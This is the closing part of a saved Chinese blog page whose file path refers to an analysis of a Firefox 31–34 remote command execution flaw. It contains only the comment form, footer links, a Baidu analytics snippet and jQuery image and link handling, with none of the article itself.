+<img alt="captcha" class="captcha" height="25" src="./Firefox 31~34远程命令执行漏洞的分析  离别歌/12f2a39b81eaf57226dfa72db381fc3f3c267f55"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="352">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="MBKsuSZ55qNdUIOj5dfnJXIToRy3oOYNkV5YimbkwdHCUncyTuJ7iBKYxV1b7iNX"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./Firefox 31~34远程命令执行漏洞的分析  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./Firefox 31~34远程命令执行漏洞的分析  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
